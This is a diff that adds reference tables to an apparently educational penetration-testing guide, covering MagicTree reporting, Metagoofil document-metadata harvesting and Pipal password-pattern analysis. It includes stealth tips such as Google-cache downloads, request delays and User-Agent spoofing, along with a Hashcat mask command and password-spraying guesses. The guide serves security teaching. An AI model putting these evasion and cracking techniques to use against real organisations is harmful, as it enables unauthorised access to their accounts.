+                        <td>Throughout engagement to maintain organized structure. Expand/collapse branches to focus on specific networks or hosts during analysis.</td>
+                        <td>Collapse "Internal Network 192.168.0.0/16" branch while working on "DMZ 10.0.1.0/24" to reduce clutter, focus attention on current target</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Data Aggregation</strong></td>
+                        <td>Combine data from multiple sources (Nmap + Nessus + manual testing) into unified tree. Merge overlapping findings, link related data across tool outputs.</td>
+                        <td>When using multiple tools on same targets. Aggregate provides complete host profile: Nmap ports + Nessus vulns + your manual notes in single view.</td>
+                        <td>Nmap imports ports → Nessus adds vulnerabilities → Manual testing adds note "SQLi confirmed in /login.php" → All data unified under host node</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Export to HTML/PDF</strong></td>
+                        <td>Generate static reports viewable without MagicTree. HTML for interactive browsing, PDF for client deliverables. Embeds tree structure and finding details.</td>
+                        <td>For client delivery or archival. HTML reports enable search/navigation, PDF provides professional formatted document with table of contents.</td>
+                        <td>File → Export → HTML → Output: engagement_report.html with collapsible tree structure, vulnerability tables, clickable navigation</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>🎯 MagicTree vs Modern Platforms</h4>
@@ -15763,6 +17773,79 @@ $ grep -i "File path:\|Folder:" results.html | grep -o "C:.*" | sort -u
 # C:\Users\jsmith\Documents\HR\
 # \\fileserver\Shared\Marketing\
 # Intelligence: Server name "fileserver", department structure</div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>-d domain</strong></td>
+                        <td>Specify target domain for document search. Metagoofil constructs Google dork: site:domain.com filetype:pdf. Focuses search on specific organization.</td>
+                        <td>Required flag for every search. Defines scope—only documents from target domain. Use primary domain (example.com) to catch all subdomains.</td>
+                        <td>metagoofil -d victim.corp -t pdf -l 50 → Searches site:victim.corp filetype:pdf → Finds public PDFs hosted on target infrastructure</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-t file-types</strong></td>
+                        <td>Comma-separated list of document types to search: pdf, doc, xls, ppt, docx, xlsx, pptx, odp, ods, odt. Each type yields different metadata patterns.</td>
+                        <td>Match expected document types. Corporations use Office formats (docx, xlsx). PDFs common for public-facing reports, presentations use pptx.</td>
+                        <td>-t pdf,docx,xlsx → Searches PDFs (annual reports), Word docs (policies), Excel sheets (financial data) → Comprehensive metadata harvest</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-l limit-results</strong></td>
+                        <td>Maximum number of search results per file type. Controls download volume. Higher limits risk Google rate limiting/captchas.</td>
+                        <td>Start with -l 50 for initial reconnaissance. Increase to -l 200+ for comprehensive harvesting (use -e delay to avoid detection).</td>
+                        <td>-l 100 → Retrieves up to 100 PDFs, 100 DOCs, 100 XLS (if -t pdf,doc,xls) → Total 300 files → Substantial metadata database</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-n download-limit</strong></td>
+                        <td>Limit actual file downloads (separate from search results). Use when you want to search many but download few. Saves bandwidth and time.</td>
+                        <td>When metadata extraction is priority over file collection. Search 500 results (-l 500) but only download 50 (-n 50) to extract representative metadata.</td>
+                        <td>-l 500 -n 50 → Finds 500 PDFs in search results → Downloads only first 50 → Extracts metadata from 50 files (faster, less storage)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-o output-dir</strong></td>
+                        <td>Directory to save downloaded files. Organizes multiple scans. Creates subdirectories per file type. Essential for managing large document collections.</td>
+                        <td>For organized storage. Use descriptive names: -o acme_corp_docs/ or -o client_osint_2026/. Facilitates later manual document review.</td>
+                        <td>-o downloads/ → Creates downloads/pdf/, downloads/doc/, downloads/xls/ → Stores files by type → Easy navigation and analysis</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-f output-file</strong></td>
+                        <td>HTML report filename containing extracted metadata tables. Includes Author, Creation Date, Software Version, File Paths. Searchable report for analysis.</td>
+                        <td>Essential for deliverables. Generate descriptive name: -f acme_metadata_report.html. Open in browser to search for usernames, software versions.</td>
+                        <td>-f metadata_report.html → Generates HTML table: Filename | Author | Creator | Created | Modified → grep for usernames and software versions</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-w save-files</strong></td>
+                        <td>Boolean flag to save downloaded files (1=yes, 0=no). If 0, extracts metadata but deletes files after processing. Saves disk space.</td>
+                        <td>Use -w 0 when only metadata matters, not file content. Use -w 1 (default) when you need files for manual review or evidence.</td>
+                        <td>-w 0 → Downloads PDF → Extracts metadata → Deletes PDF → Keeps only metadata in report (minimal storage footprint)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-r remote-download</strong></td>
+                        <td>Download files from remote Google cache instead of direct from target site. Reduces footprint on target infrastructure (no HTTP requests logged).</td>
+                        <td>For stealthy reconnaissance. Downloading from target's web server leaves logs. Google cache download is anonymous (target never sees your IP).</td>
+                        <td>-r → Retrieves PDF from Google's cached copy → Target server logs show zero activity → Completely passive reconnaissance</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-e delay-seconds</strong></td>
+                        <td>Delay in seconds between Google searches. Prevents rate limiting and captchas. Higher delay = slower scan but lower detection risk.</td>
+                        <td>Essential for large scans (-l 200+). Use -e 2 for moderate scanning, -e 5+ for maximum stealth. Balance speed vs operational security.</td>
+                        <td>-e 3 → Waits 3 seconds between searches → Google sees slower request rate → Appears as human browsing → Avoids IP blocking</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-u user-agent</strong></td>
+                        <td>Custom User-Agent string for HTTP requests. Disguises Metagoofil as legitimate browser (Chrome, Firefox). Evades tool-based blocking.</td>
+                        <td>When default User-Agent is blocked. Rotate User-Agents across scans to avoid fingerprinting. Use common browser strings for legitimacy.</td>
+                        <td>-u "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0" → Appears as Windows Chrome user → Less suspicious than default Python UA</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="warning-box">
                 <h4>⚠️ Metagoofil Legal and Ethical Considerations</h4>
@@ -15836,6 +17919,79 @@ $ pipal -o html -f report.html passwords.txt
 #   2024: 890 (8.90%)
 # Months: January, March, September most common
 # Intelligence: Users favor current year, Q1 months (Jan password resets)</div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Analysis Feature</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Length Distribution</strong></td>
+                        <td>Statistical breakdown of password lengths (8, 10, 12, 14+ characters). Identifies clustering at policy minimum. Reveals user tendency to meet bare minimum complexity.</td>
+                        <td>For policy compliance analysis. If policy requires 12 characters but 60% use exactly 12, users aren't embracing security—they're checking a box.</td>
+                        <td>Output: Length 12: 3,892 (38.92%) ← Peak at minimum → Report: "Users cluster at minimum length, suggest raising requirement to 14"</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Character Frequency</strong></td>
+                        <td>Tracks usage of lowercase, uppercase, digits, special characters. Shows position preferences (special chars at end vs middle). Identifies minimal effort compliance.</td>
+                        <td>To assess complexity rule effectiveness. If 87% of special characters are at password end, users append ! to satisfy requirements without true randomness.</td>
+                        <td>Output: Special chars: 6,734 (67.34%) → Position 12 (end): 5,892 (87.5%) → Intelligence: Users append ! to meet policy, predictable pattern</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Position Analysis</strong></td>
+                        <td>Analyzes character placement patterns (uppercase first, digit last, special at end). Reveals position-based predictability for optimized cracking rules.</td>
+                        <td>For rule generation. If 80% capitalize first letter, create Hashcat rule: $! (append exclamation) → Test against observed patterns.</td>
+                        <td>Output: Position 1 uppercase: 7,234 (72.34%) → Position 12 special: 5,892 (58.92%) → Create rule: Capitalize first + append ! + year</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Masks</strong></td>
+                        <td>Password structure patterns using mask notation (?u=upper, ?l=lower, ?d=digit, ?s=special). Example: ?u?l?l?l?l?l?d?d?d?d?s = Capital + 5 lower + 4 digits + special.</td>
+                        <td>For mask-based cracking with Hashcat. Identify top 10 masks, generate targeted mask attacks instead of brute force. Dramatically reduces keyspace.</td>
+                        <td>Top mask: ?u?l?l?l?l?l?l?d?d?d?d?s (2,345 occurrences) → Hashcat -a 3 -m 1000 hash.txt ?u?l?l?l?l?l?l?d?d?d?d?s → Cracks matching passwords</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Base Words</strong></td>
+                        <td>Extracts root words from passwords (Password, Welcome, Company, Admin). Identifies organization-specific terms and common dictionary words.</td>
+                        <td>For wordlist generation. Top base words become foundation for targeted dictionary: If "CompanyName" appears 567 times, add to wordlist with variations.</td>
+                        <td>Top base words: password (1,234), welcome (892), acmecorp (567) → Generate: Acmecorp2026!, Acmecorp2025@, AcmecorpWelcome2026#</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Years/Dates</strong></td>
+                        <td>Frequency of years (2024, 2025, 2026) and dates (010126 for Jan 1, 2026). Tracks temporal patterns in password creation/rotation.</td>
+                        <td>To predict current password patterns. If most passwords contain 2026, likely created in Q1 2026. Test year-based variations in password spraying.</td>
+                        <td>Years: 2026 (2,345 occurrences), 2025 (1,234), 2024 (890) → Password spraying: CompanyName2026!, Welcome2026@, Password2026#</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Days/Months</strong></td>
+                        <td>Identifies day names (Monday-Sunday) and month names (January-December) in passwords. Reveals seasonal password reset patterns (January spikes).</td>
+                        <td>For seasonal targeting. January password resets common (New Year, policy expiration). Test JanuaryYear!, Month+Year patterns.</td>
+                        <td>Months: January (456), March (389), September (234) → Intelligence: Q1 password resets → Test: January2026!, March2026@, SpringReset2026#</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Colors</strong></td>
+                        <td>Detects color words (Red, Blue, Black, Green). Common in user-generated passwords (easy to remember, satisfy length requirements).</td>
+                        <td>When base word analysis shows color patterns. Add colors to wordlist: RedCompany2026!, BlueWelcome2026@. Unexpected but effective pattern.</td>
+                        <td>Colors: blue (234), red (198), black (156) → Wordlist: BlueAcme2026!, RedCorp2026@, BlackHat2026# (color + company + year + special)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Keywords</strong></td>
+                        <td>Industry-specific or organization-specific terms. Healthcare: Patient, Doctor, Medical. Finance: Capital, Investment, Secure. Tech: Admin, System, Root.</td>
+                        <td>For industry-targeted attacks. Analyze cracked passwords from similar organizations to identify vertical-specific patterns. Build industry wordlists.</td>
+                        <td>Healthcare: Patient2026! (89), Doctor2026@ (67), Medical2026# (45) → Generate healthcare wordlist for future medical industry engagements</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Top Patterns</strong></td>
+                        <td>Aggregated pattern summary combining base word, transformation, year, special character. Shows holistic password construction methodology.</td>
+                        <td>For comprehensive wordlist generation. Use top 10 patterns to create targeted dictionary covering 40-60% of likely passwords with minimal keyspace.</td>
+                        <td>Pattern 1: BaseWord + Year + Special (32.45%) → Pattern 2: BaseWord + Month + Year (12.34%) → Generate combined wordlist covering both patterns</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>🎯 Pipal Intelligence for Targeted Attacks</h4>
